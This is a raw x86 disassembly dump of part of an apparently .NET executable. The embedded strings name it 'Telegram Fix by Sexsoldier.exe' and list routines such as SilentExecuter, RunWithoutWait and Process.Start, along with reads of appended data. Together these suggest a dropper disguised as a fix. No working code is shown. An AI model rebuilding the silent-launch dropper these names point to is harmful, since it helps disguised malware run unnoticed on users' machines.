  4025ea:	2e 00 0b             	add    %cl,%cs:(%ebx)
  4025ed:	00 ff                	add    %bh,%bh
  4025ef:	00 2e                	add    %ch,(%esi)
  4025f1:	00 13                	add    %dl,(%ebx)
  4025f3:	00 08                	add    %cl,(%eax)
  4025f5:	01 63 00             	add    %esp,0x0(%ebx)
  4025f8:	83 00 5e             	addl   $0x5e,(%eax)
  4025fb:	00 b3 00 f8 00 37    	add    %dh,0x3700f800(%ebx)
  402601:	00 a4 00 50 20 00 00 	add    %ah,0x2050(%eax,%eax,1)
  402608:	01 00                	add    %eax,(%eax)
  40260a:	04 80                	add    $0x80,%al
	...
  40261c:	d7                   	xlat   %ds:(%ebx)
  40261d:	00 00                	add    %al,(%eax)
  40261f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40262a:	00 00                	add    %al,(%eax)
  40262c:	01 00                	add    %eax,(%eax)
  40262e:	40                   	inc    %eax
  40262f:	00 00                	add    %al,(%eax)
  402631:	00 00                	add    %al,(%eax)
  402633:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40263e:	00 00                	add    %al,(%eax)
  402640:	01 00                	add    %eax,(%eax)
  402642:	49                   	dec    %ecx
	...
  40264b:	00 00                	add    %al,(%eax)
  40264d:	3c 4d                	cmp    $0x4d,%al
  40264f:	6f                   	outsl  %ds:(%esi),(%dx)
  402650:	64 75 6c             	fs jne 0x4026bf
  402653:	65 3e 00 54 65 6c    	gs add %dl,%ds:0x6c(%ebp,%eiz,2)
  402659:	65 67 72 61          	gs addr16 jb 0x4026be
  40265d:	6d                   	insl   (%dx),%es:(%edi)
  40265e:	20 46 69             	and    %al,0x69(%esi)
  402661:	78 20                	js     0x402683
  402663:	62 79 20             	bound  %edi,0x20(%ecx)
  402666:	53                   	push   %ebx
  402667:	65 78 73             	gs js  0x4026dd
  40266a:	6f                   	outsl  %ds:(%esi),(%dx)
  40266b:	6c                   	insb   (%dx),%es:(%edi)
  40266c:	64 69 65 72 2e 65 78 	imul   $0x6578652e,%fs:0x72(%ebp),%esp
  402673:	65 
  402674:	00 50 72             	add    %dl,0x72(%eax)
  402677:	6f                   	outsl  %ds:(%esi),(%dx)
  402678:	67 72 61             	addr16 jb 0x4026dc
  40267b:	6d                   	insl   (%dx),%es:(%edi)
  40267c:	00 53 69             	add    %dl,0x69(%ebx)
  40267f:	6c                   	insb   (%dx),%es:(%edi)
  402680:	65 6e                	outsb  %gs:(%esi),(%dx)
  402682:	74 45                	je     0x4026c9
  402684:	78 65                	js     0x4026eb
  402686:	63 75 74             	arpl   %esi,0x74(%ebp)
  402689:	65 72 00             	gs jb  0x40268c
  40268c:	6d                   	insl   (%dx),%es:(%edi)
  40268d:	73 63                	jae    0x4026f2
  40268f:	6f                   	outsl  %ds:(%esi),(%dx)
  402690:	72 6c                	jb     0x4026fe
  402692:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  402699:	65 6d                	gs insl (%dx),%es:(%edi)
  40269b:	00 4f 62             	add    %cl,0x62(%edi)
  40269e:	6a 65                	push   $0x65
  4026a0:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  4026a4:	61                   	popa
  4026a5:	69 6e 00 52 75 6e 57 	imul   $0x576e7552,0x0(%esi),%ebp
  4026ac:	69 74 68 6f 75 74 57 	imul   $0x61577475,0x6f(%eax,%ebp,2),%esi
  4026b3:	61 
  4026b4:	69 74 00 2e 63 74 6f 	imul   $0x726f7463,0x2e(%eax,%eax,1),%esi
  4026bb:	72 
  4026bc:	00 65 78             	add    %ah,0x78(%ebp)
  4026bf:	65 50                	gs push %eax
  4026c1:	61                   	popa
  4026c2:	74 68                	je     0x40272c
  4026c4:	00 53 79             	add    %dl,0x79(%ebx)
  4026c7:	73 74                	jae    0x40273d
  4026c9:	65 6d                	gs insl (%dx),%es:(%edi)
  4026cb:	2e 52                	cs push %edx
  4026cd:	75 6e                	jne    0x40273d
  4026cf:	74 69                	je     0x40273a
  4026d1:	6d                   	insl   (%dx),%es:(%edi)
  4026d2:	65 2e 43             	gs cs inc %ebx
  4026d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d6:	6d                   	insl   (%dx),%es:(%edi)
  4026d7:	70 69                	jo     0x402742
  4026d9:	6c                   	insb   (%dx),%es:(%edi)
  4026da:	65 72 53             	gs jb  0x402730
  4026dd:	65 72 76             	gs jb  0x402756
  4026e0:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  4026e7:	6d                   	insl   (%dx),%es:(%edi)
  4026e8:	70 69                	jo     0x402753
  4026ea:	6c                   	insb   (%dx),%es:(%edi)
  4026eb:	61                   	popa
  4026ec:	74 69                	je     0x402757
  4026ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4026ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4026f0:	52                   	push   %edx
  4026f1:	65 6c                	gs insb (%dx),%es:(%edi)
  4026f3:	61                   	popa
  4026f4:	78 61                	js     0x402757
  4026f6:	74 69                	je     0x402761
  4026f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4026f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4026fa:	73 41                	jae    0x40273d
  4026fc:	74 74                	je     0x402772
  4026fe:	72 69                	jb     0x402769
  402700:	62 75 74             	bound  %esi,0x74(%ebp)
  402703:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402707:	6e                   	outsb  %ds:(%esi),(%dx)
  402708:	74 69                	je     0x402773
  40270a:	6d                   	insl   (%dx),%es:(%edi)
  40270b:	65 43                	gs inc %ebx
  40270d:	6f                   	outsl  %ds:(%esi),(%dx)
  40270e:	6d                   	insl   (%dx),%es:(%edi)
  40270f:	70 61                	jo     0x402772
  402711:	74 69                	je     0x40277c
  402713:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402716:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40271d:	69 
  40271e:	62 75 74             	bound  %esi,0x74(%ebp)
  402721:	65 00 54 65 6c       	add    %dl,%gs:0x6c(%ebp,%eiz,2)
  402726:	65 67 72 61          	gs addr16 jb 0x40278b
  40272a:	6d                   	insl   (%dx),%es:(%edi)
  40272b:	20 46 69             	and    %al,0x69(%esi)
  40272e:	78 20                	js     0x402750
  402730:	62 79 20             	bound  %edi,0x20(%ecx)
  402733:	53                   	push   %ebx
  402734:	65 78 73             	gs js  0x4027aa
  402737:	6f                   	outsl  %ds:(%esi),(%dx)
  402738:	6c                   	insb   (%dx),%es:(%edi)
  402739:	64 69 65 72 00 45 6e 	imul   $0x766e4500,%fs:0x72(%ebp),%esp
  402740:	76 
  402741:	69 72 6f 6e 6d 65 6e 	imul   $0x6e656d6e,0x6f(%edx),%esi
  402748:	74 00                	je     0x40274a
  40274a:	53                   	push   %ebx
  40274b:	70 65                	jo     0x4027b2
  40274d:	63 69 61             	arpl   %ebp,0x61(%ecx)
  402750:	6c                   	insb   (%dx),%es:(%edi)
  402751:	46                   	inc    %esi
  402752:	6f                   	outsl  %ds:(%esi),(%dx)
  402753:	6c                   	insb   (%dx),%es:(%edi)
  402754:	64 65 72 00          	fs gs jb 0x402758
  402758:	47                   	inc    %edi
  402759:	65 74 46             	gs je  0x4027a2
  40275c:	6f                   	outsl  %ds:(%esi),(%dx)
  40275d:	6c                   	insb   (%dx),%es:(%edi)
  40275e:	64 65 72 50          	fs gs jb 0x4027b2
  402762:	61                   	popa
  402763:	74 68                	je     0x4027cd
  402765:	00 47 75             	add    %al,0x75(%edi)
  402768:	69 64 00 4e 65 77 47 	imul   $0x75477765,0x4e(%eax,%eax,1),%esp
  40276f:	75 
  402770:	69 64 00 54 6f 53 74 	imul   $0x7274536f,0x54(%eax,%eax,1),%esp
  402777:	72 
  402778:	69 6e 67 00 53 74 72 	imul   $0x72745300,0x67(%esi),%ebp
  40277f:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%esi),%ebp
  402786:	63 61 74             	arpl   %esp,0x74(%ecx)
  402789:	00 53 79             	add    %dl,0x79(%ebx)
  40278c:	73 74                	jae    0x402802
  40278e:	65 6d                	gs insl (%dx),%es:(%edi)
  402790:	2e 49                	cs dec %ecx
  402792:	4f                   	dec    %edi
  402793:	00 50 61             	add    %dl,0x61(%eax)
  402796:	74 68                	je     0x402800
  402798:	00 43 6f             	add    %al,0x6f(%ebx)
  40279b:	6d                   	insl   (%dx),%es:(%edi)
  40279c:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  40279f:	65 00 44 69 72       	add    %al,%gs:0x72(%ecx,%ebp,2)
  4027a4:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  4027a9:	79 00                	jns    0x4027ab
  4027ab:	44                   	inc    %esp
  4027ac:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4027b3:	79 49                	jns    0x4027fe
  4027b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4027b6:	66 6f                	outsw  %ds:(%esi),(%dx)
  4027b8:	00 43 72             	add    %al,0x72(%ebx)
  4027bb:	65 61                	gs popa
  4027bd:	74 65                	je     0x402824
  4027bf:	44                   	inc    %esp
  4027c0:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4027c7:	79 00                	jns    0x4027c9
  4027c9:	53                   	push   %ebx
  4027ca:	79 73                	jns    0x40283f
  4027cc:	74 65                	je     0x402833
  4027ce:	6d                   	insl   (%dx),%es:(%edi)
  4027cf:	2e 43                	cs inc %ebx
  4027d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4027d2:	6c                   	insb   (%dx),%es:(%edi)
  4027d3:	6c                   	insb   (%dx),%es:(%edi)
  4027d4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4027d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4027da:	73 2e                	jae    0x40280a
  4027dc:	47                   	inc    %edi
  4027dd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4027df:	65 72 69             	gs jb  0x40284b
  4027e2:	63 00                	arpl   %eax,(%eax)
  4027e4:	4c                   	dec    %esp
  4027e5:	69 73 74 60 31 00 53 	imul   $0x53003160,0x74(%ebx),%esi
  4027ec:	79 73                	jns    0x402861
  4027ee:	74 65                	je     0x402855
  4027f0:	6d                   	insl   (%dx),%es:(%edi)
  4027f1:	2e 52                	cs push %edx
  4027f3:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4027f6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4027fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4027fc:	00 41 73             	add    %al,0x73(%ecx)
  4027ff:	73 65                	jae    0x402866
  402801:	6d                   	insl   (%dx),%es:(%edi)
  402802:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  402806:	47                   	inc    %edi
  402807:	65 74 45             	gs je  0x40284f
  40280a:	78 65                	js     0x402871
  40280c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40280f:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  402816:	6d                   	insl   (%dx),%es:(%edi)
  402817:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40281b:	67 65 74 5f          	addr16 gs je 0x40287e
  40281f:	4c                   	dec    %esp
  402820:	6f                   	outsl  %ds:(%esi),(%dx)
  402821:	63 61 74             	arpl   %esp,0x74(%ecx)
  402824:	69 6f 6e 00 46 69 6c 	imul   $0x6c694600,0x6e(%edi),%ebp
  40282b:	65 53                	gs push %ebx
  40282d:	74 72                	je     0x4028a1
  40282f:	65 61                	gs popa
  402831:	6d                   	insl   (%dx),%es:(%edi)
  402832:	00 46 69             	add    %al,0x69(%esi)
  402835:	6c                   	insb   (%dx),%es:(%edi)
  402836:	65 4d                	gs dec %ebp
  402838:	6f                   	outsl  %ds:(%esi),(%dx)
  402839:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  40283e:	6c                   	insb   (%dx),%es:(%edi)
  40283f:	65 41                	gs inc %ecx
  402841:	63 63 65             	arpl   %esp,0x65(%ebx)
  402844:	73 73                	jae    0x4028b9
  402846:	00 53 74             	add    %dl,0x74(%ebx)
  402849:	72 65                	jb     0x4028b0
  40284b:	61                   	popa
  40284c:	6d                   	insl   (%dx),%es:(%edi)
  40284d:	00 67 65             	add    %ah,0x65(%edi)
  402850:	74 5f                	je     0x4028b1
  402852:	4c                   	dec    %esp
  402853:	65 6e                	outsb  %gs:(%esi),(%dx)
  402855:	67 74 68             	addr16 je 0x4028c0
  402858:	00 53 65             	add    %dl,0x65(%ebx)
  40285b:	65 6b 4f 72 69       	imul   $0x69,%gs:0x72(%edi),%ecx
  402860:	67 69 6e 00 53 65 65 	imul   $0x6b656553,0x0(%bp),%ebp
  402867:	6b 
  402868:	00 42 79             	add    %al,0x79(%edx)
  40286b:	74 65                	je     0x4028d2
  40286d:	00 52 65             	add    %dl,0x65(%edx)
  402870:	61                   	popa
  402871:	64 00 3c 50          	add    %bh,%fs:(%eax,%edx,2)
  402875:	72 69                	jb     0x4028e0
  402877:	76 61                	jbe    0x4028da
  402879:	74 65                	je     0x4028e0
  40287b:	49                   	dec    %ecx
  40287c:	6d                   	insl   (%dx),%es:(%edi)
  40287d:	70 6c                	jo     0x4028eb
  40287f:	65 6d                	gs insl (%dx),%es:(%edi)
  402881:	65 6e                	outsb  %gs:(%esi),(%dx)
  402883:	74 61                	je     0x4028e6
  402885:	74 69                	je     0x4028f0
  402887:	6f                   	outsl  %ds:(%esi),(%dx)
  402888:	6e                   	outsb  %ds:(%esi),(%dx)
  402889:	44                   	inc    %esp
  40288a:	65 74 61             	gs je  0x4028ee
  40288d:	69 6c 73 3e 7b 33 41 	imul   $0x3141337b,0x3e(%ebx,%esi,2),%ebp
  402894:	31 
  402895:	30 34 44             	xor    %dh,(%esp,%eax,2)
  402898:	33 30                	xor    (%eax),%esi
  40289a:	2d 36 42 30 41       	sub    $0x41304236,%eax
  40289f:	2d 34 31 44 42       	sub    $0x42443134,%eax
  4028a4:	2d 41 37 38 38       	sub    $0x38383741,%eax
  4028a9:	2d 32 43 39 41       	sub    $0x41394332,%eax
  4028ae:	35 35 35 41 43       	xor    $0x43413535,%eax
  4028b3:	43                   	inc    %ebx
  4028b4:	44                   	inc    %esp
  4028b5:	39 7d 00             	cmp    %edi,0x0(%ebp)
  4028b8:	43                   	inc    %ebx
  4028b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4028ba:	6d                   	insl   (%dx),%es:(%edi)
  4028bb:	70 69                	jo     0x402926
  4028bd:	6c                   	insb   (%dx),%es:(%edi)
  4028be:	65 72 47             	gs jb  0x402908
  4028c1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4028c3:	65 72 61             	gs jb  0x402927
  4028c6:	74 65                	je     0x40292d
  4028c8:	64 41                	fs inc %ecx
  4028ca:	74 74                	je     0x402940
  4028cc:	72 69                	jb     0x402937
  4028ce:	62 75 74             	bound  %esi,0x74(%ebp)
  4028d1:	65 00 24 24          	add    %ah,%gs:(%esp)
  4028d5:	6d                   	insl   (%dx),%es:(%edi)
  4028d6:	65 74 68             	gs je  0x402941
  4028d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4028da:	64 30 78 36          	xor    %bh,%fs:0x36(%eax)
  4028de:	30 30                	xor    %dh,(%eax)
  4028e0:	30 30                	xor    %dh,(%eax)
  4028e2:	30 31                	xor    %dh,(%ecx)
  4028e4:	2d 31 00 52 75       	sub    $0x75520031,%eax
  4028e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4028ea:	74 69                	je     0x402955
  4028ec:	6d                   	insl   (%dx),%es:(%edi)
  4028ed:	65 48                	gs dec %eax
  4028ef:	65 6c                	gs insb (%dx),%es:(%edi)
  4028f1:	70 65                	jo     0x402958
  4028f3:	72 73                	jb     0x402968
  4028f5:	00 41 72             	add    %al,0x72(%ecx)
  4028f8:	72 61                	jb     0x40295b
  4028fa:	79 00                	jns    0x4028fc
  4028fc:	52                   	push   %edx
  4028fd:	75 6e                	jne    0x40296d
  4028ff:	74 69                	je     0x40296a
  402901:	6d                   	insl   (%dx),%es:(%edi)
  402902:	65 46                	gs inc %esi
  402904:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  40290b:	64 6c                	fs insb (%dx),%es:(%edi)
  40290d:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  402911:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  402918:	65 
  402919:	41                   	inc    %ecx
  40291a:	72 72                	jb     0x40298e
  40291c:	61                   	popa
  40291d:	79 00                	jns    0x40291f
  40291f:	42                   	inc    %edx
  402920:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  402927:	72 
  402928:	74 65                	je     0x40298f
  40292a:	72 00                	jb     0x40292c
  40292c:	54                   	push   %esp
  40292d:	6f                   	outsl  %ds:(%esi),(%dx)
  40292e:	49                   	dec    %ecx
  40292f:	6e                   	outsb  %ds:(%esi),(%dx)
  402930:	74 36                	je     0x402968
  402932:	34 00                	xor    $0x0,%al
  402934:	54                   	push   %esp
  402935:	6f                   	outsl  %ds:(%esi),(%dx)
  402936:	49                   	dec    %ecx
  402937:	6e                   	outsb  %ds:(%esi),(%dx)
  402938:	74 33                	je     0x40296d
  40293a:	32 00                	xor    (%eax),%al
  40293c:	53                   	push   %ebx
  40293d:	79 73                	jns    0x4029b2
  40293f:	74 65                	je     0x4029a6
  402941:	6d                   	insl   (%dx),%es:(%edi)
  402942:	2e 54                	cs push %esp
  402944:	65 78 74             	gs js  0x4029bb
  402947:	00 45 6e             	add    %al,0x6e(%ebp)
  40294a:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40294d:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  402954:	5f                   	pop    %edi
  402955:	55                   	push   %ebp
  402956:	54                   	push   %esp
  402957:	46                   	inc    %esi
  402958:	38 00                	cmp    %al,(%eax)
  40295a:	47                   	inc    %edi
  40295b:	65 74 53             	gs je  0x4029b1
  40295e:	74 72                	je     0x4029d2
  402960:	69 6e 67 00 4d 61 74 	imul   $0x74614d00,0x67(%esi),%ebp
  402967:	68 00 4d 69 6e       	push   $0x6e694d00
  40296c:	00 57 72             	add    %dl,0x72(%edi)
  40296f:	69 74 65 00 49 44 69 	imul   $0x73694449,0x0(%ebp,%eiz,2),%esi
  402976:	73 
  402977:	70 6f                	jo     0x4029e8
  402979:	73 61                	jae    0x4029dc
  40297b:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40297f:	44                   	inc    %esp
  402980:	69 73 70 6f 73 65 00 	imul   $0x65736f,0x70(%ebx),%esi
  402987:	41                   	inc    %ecx
  402988:	64 64 00 45 6e       	fs add %al,%fs:0x6e(%ebp)
  40298d:	75 6d                	jne    0x4029fc
  40298f:	65 72 61             	gs jb  0x4029f3
  402992:	74 6f                	je     0x402a03
  402994:	72 00                	jb     0x402996
  402996:	47                   	inc    %edi
  402997:	65 74 45             	gs je  0x4029df
  40299a:	6e                   	outsb  %ds:(%esi),(%dx)
  40299b:	75 6d                	jne    0x402a0a
  40299d:	65 72 61             	gs jb  0x402a01
  4029a0:	74 6f                	je     0x402a11
  4029a2:	72 00                	jb     0x4029a4
  4029a4:	67 65 74 5f          	addr16 gs je 0x402a07
  4029a8:	43                   	inc    %ebx
  4029a9:	75 72                	jne    0x402a1d
  4029ab:	72 65                	jb     0x402a12
  4029ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4029ae:	74 00                	je     0x4029b0
  4029b0:	4d                   	dec    %ebp
  4029b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4029b2:	76 65                	jbe    0x402a19
  4029b4:	4e                   	dec    %esi
  4029b5:	65 78 74             	gs js  0x402a2c
  4029b8:	00 53 79             	add    %dl,0x79(%ebx)
  4029bb:	73 74                	jae    0x402a31
  4029bd:	65 6d                	gs insl (%dx),%es:(%edi)
  4029bf:	2e 44                	cs inc %esp
  4029c1:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4029c8:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
  4029cf:	63 65 73             	arpl   %esp,0x73(%ebp)
  4029d2:	73 53                	jae    0x402a27
  4029d4:	74 61                	je     0x402a37
  4029d6:	72 74                	jb     0x402a4c
  4029d8:	49                   	dec    %ecx
  4029d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4029da:	66 6f                	outsw  %ds:(%esi),(%dx)
  4029dc:	00 73 65             	add    %dh,0x65(%ebx)
  4029df:	74 5f                	je     0x402a40
  4029e1:	46                   	inc    %esi
  4029e2:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4029e9:	00 
  4029ea:	47                   	inc    %edi
  4029eb:	65 74 44             	gs je  0x402a32
  4029ee:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4029f5:	79 4e                	jns    0x402a45
  4029f7:	61                   	popa
  4029f8:	6d                   	insl   (%dx),%es:(%edi)
  4029f9:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4029fd:	74 5f                	je     0x402a5e
  4029ff:	57                   	push   %edi
  402a00:	6f                   	outsl  %ds:(%esi),(%dx)
  402a01:	72 6b                	jb     0x402a6e
  402a03:	69 6e 67 44 69 72 65 	imul   $0x65726944,0x67(%esi),%ebp
  402a0a:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  402a0e:	79 00                	jns    0x402a10
  402a10:	73 65                	jae    0x402a77
  402a12:	74 5f                	je     0x402a73
  402a14:	55                   	push   %ebp
  402a15:	73 65                	jae    0x402a7c
  402a17:	53                   	push   %ebx
  402a18:	68 65 6c 6c 45       	push   $0x456c6c65
  402a1d:	78 65                	js     0x402a84
  402a1f:	63 75 74             	arpl   %esi,0x74(%ebp)
  402a22:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  402a26:	6f                   	outsl  %ds:(%esi),(%dx)
  402a27:	63 65 73             	arpl   %esp,0x73(%ebp)
  402a2a:	73 00                	jae    0x402a2c
  402a2c:	53                   	push   %ebx
  402a2d:	74 61                	je     0x402a90
  402a2f:	72 74                	jb     0x402aa5
  402a31:	00 00                	add    %al,(%eax)
  402a33:	00 00                	add    %al,(%eax)
  402a35:	17                   	pop    %ss
  402a36:	4d                   	dec    %ebp
  402a37:	00 65 00             	add    %ah,0x0(%ebp)
  402a3a:	72 00                	jb     0x402a3c
  402a3c:	67 00 65 00          	add    %ah,0x0(%di)
  402a40:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  402a44:	70 00                	jo     0x402a46
  402a46:	70 00                	jo     0x402a48
  402a48:	73 00                	jae    0x402a4a
  402a4a:	5f                   	pop    %edi
  402a4b:	00 00                	add    %al,(%eax)
  402a4d:	00 00                	add    %al,(%eax)
  402a4f:	00 30                	add    %dh,(%eax)
  402a51:	4d                   	dec    %ebp
  402a52:	10 3a                	adc    %bh,(%edx)
  402a54:	0a 6b db             	or     -0x25(%ebx),%ch
  402a57:	41                   	inc    %ecx
  402a58:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402a59:	88 2c 9a             	mov    %ch,(%edx,%ebx,4)
  402a5c:	55                   	push   %ebp
  402a5d:	5a                   	pop    %edx
  402a5e:	cc                   	int3
  402a5f:	d9 00                	flds   (%eax)
  402a61:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  402a67:	34 e0                	xor    $0xe0,%al
  402a69:	89 03                	mov    %eax,(%ebx)
  402a6b:	00 00                	add    %al,(%eax)
  402a6d:	01 04 00             	add    %eax,(%eax,%eax,1)
  402a70:	01 01                	add    %eax,(%ecx)
  402a72:	0e                   	push   %cs
  402a73:	03 20                	add    (%eax),%esp
  402a75:	00 01                	add    %al,(%ecx)
  402a77:	04 20                	add    $0x20,%al
  402a79:	01 01                	add    %eax,(%ecx)
  402a7b:	08 05 00 01 0e 11    	or     %al,0x110e0100
  402a81:	15 04 00 00 11       	adc    $0x11000004,%eax
  402a86:	19 03                	sbb    %eax,(%ebx)
  402a88:	20 00                	and    %al,(%eax)
  402a8a:	0e                   	push   %cs
  402a8b:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  402a90:	0e                   	push   %cs
  402a91:	05 00 01 12 29       	add    $0x29120100,%eax
  402a96:	0e                   	push   %cs
  402a97:	05 15 12 2d 01       	add    $0x12d1215,%eax
  402a9c:	0e                   	push   %cs
  402a9d:	04 00                	add    $0x0,%al
  402a9f:	00 12                	add    %dl,(%edx)
  402aa1:	31 08                	xor    %ecx,(%eax)
  402aa3:	20 03                	and    %al,(%ebx)
  402aa5:	01 0e                	add    %ecx,(%esi)
  402aa7:	11 39                	adc    %edi,(%ecx)
  402aa9:	11 3d 03 20 00 0a    	adc    %edi,0xa002003
  402aaf:	06                   	push   %es
  402ab0:	20 02                	and    %al,(%edx)
  402ab2:	0a 0a                	or     (%edx),%cl
  402ab4:	11 45 07             	adc    %eax,0x7(%ebp)
  402ab7:	20 03                	and    %al,(%ebx)
  402ab9:	08 1d 05 08 08 04    	or     %bl,0x4080805
  402abf:	01 00                	add    %eax,(%eax)
  402ac1:	00 00                	add    %al,(%eax)
  402ac3:	02 06                	add    (%esi),%al
  402ac5:	08 07                	or     %al,(%edi)
  402ac7:	00 02                	add    %al,(%edx)
  402ac9:	01 12                	add    %edx,(%edx)
  402acb:	55                   	push   %ebp
  402acc:	11 59 06             	adc    %ebx,0x6(%ecx)
  402acf:	00 02                	add    %al,(%edx)
  402ad1:	0a 1d 05 08 06 00    	or     0x60805,%bl
  402ad7:	02 08                	add    (%eax),%cl
  402ad9:	1d 05 08 04 00       	sbb    $0x40805,%eax
  402ade:	00 12                	add    %dl,(%edx)
  402ae0:	61                   	popa
  402ae1:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
  402ae6:	05 05 00 02 0a       	add    $0xa020005,%eax
  402aeb:	0a 0a                	or     (%edx),%cl
  402aed:	07                   	pop    %es
  402aee:	20 03                	and    %al,(%ebx)
  402af0:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  402af6:	20 01                	and    %al,(%ecx)
  402af8:	01 13                	add    %edx,(%ebx)
  402afa:	00 08                	add    %cl,(%eax)
  402afc:	20 00                	and    %al,(%eax)
  402afe:	15 11 6d 01 13       	adc    $0x13016d11,%eax
  402b03:	00 05 15 11 6d 01    	add    %al,0x16d1115
  402b09:	0e                   	push   %cs
  402b0a:	04 20                	add    $0x20,%al
  402b0c:	00 13                	add    %dl,(%ebx)
  402b0e:	00 03                	add    %al,(%ebx)
  402b10:	20 00                	and    %al,(%eax)
  402b12:	02 2e                	add    (%esi),%ch
  402b14:	07                   	pop    %es
  402b15:	1b 0e                	sbb    (%esi),%ecx
  402b17:	15 12 2d 01 0e       	adc    $0xe012d12,%eax
  402b1c:	0e                   	push   %cs
  402b1d:	12 35 0a 1d 05 1d    	adc    0x1d051d0a,%dh
  402b23:	05 02 08 0a 08       	add    $0x80a0802,%eax
  402b28:	08 1d 05 08 1d 05    	or     %bl,0x51d0805
  402b2e:	0e                   	push   %cs
  402b2f:	1d 05 0a 0e 12       	sbb    $0x120e0a05,%eax
  402b34:	35 1d 05 0a 08       	xor    $0x80a051d,%eax
  402b39:	08 0e                	or     %cl,(%esi)
  402b3b:	11 19                	adc    %ebx,(%ecx)
  402b3d:	15 11 6d 01 0e       	adc    $0xe016d11,%eax
  402b42:	04 20                	add    $0x20,%al
  402b44:	01 01                	add    %eax,(%ecx)
  402b46:	0e                   	push   %cs
  402b47:	04 00                	add    $0x0,%al
  402b49:	01 0e                	add    %ecx,(%esi)
  402b4b:	0e                   	push   %cs
  402b4c:	04 20                	add    $0x20,%al
  402b4e:	01 01                	add    %eax,(%ecx)
  402b50:	02 06                	add    (%esi),%al
  402b52:	00 01                	add    %al,(%ecx)
  402b54:	12 75 12             	adc    0x12(%ebp),%dh
  402b57:	71 06                	jno    0x402b5f
  402b59:	07                   	pop    %es
  402b5a:	02 12                	add    (%edx),%dl
  402b5c:	71 12                	jno    0x402b70
  402b5e:	71 08                	jno    0x402b68
  402b60:	01 00                	add    %eax,(%eax)
  402b62:	08 00                	or     %al,(%eax)
  402b64:	00 00                	add    %al,(%eax)
  402b66:	00 00                	add    %al,(%eax)
  402b68:	1e                   	push   %ds
  402b69:	01 00                	add    %eax,(%eax)
  402b6b:	01 00                	add    %eax,(%eax)
  402b6d:	54                   	push   %esp
  402b6e:	02 16                	add    (%esi),%dl
  402b70:	57                   	push   %edi
  402b71:	72 61                	jb     0x402bd4
  402b73:	70 4e                	jo     0x402bc3
  402b75:	6f                   	outsl  %ds:(%esi),(%dx)
  402b76:	6e                   	outsb  %ds:(%esi),(%dx)
  402b77:	45                   	inc    %ebp
  402b78:	78 63                	js     0x402bdd
  402b7a:	65 70 74             	gs jo  0x402bf1
  402b7d:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  402b84:	77 73                	ja     0x402bf9
  402b86:	01 00                	add    %eax,(%eax)
  402b88:	b0 2b                	mov    $0x2b,%al
	...
  402b92:	00 00                	add    %al,(%eax)
  402b94:	ce                   	into
  402b95:	2b 00                	sub    (%eax),%eax
  402b97:	00 00                	add    %al,(%eax)
  402b99:	20 00                	and    %al,(%eax)
	...
  402baf:	00 c0                	add    %al,%al
  402bb1:	2b 00                	sub    (%eax),%eax
	...
  402bbf:	00 00                	add    %al,(%eax)
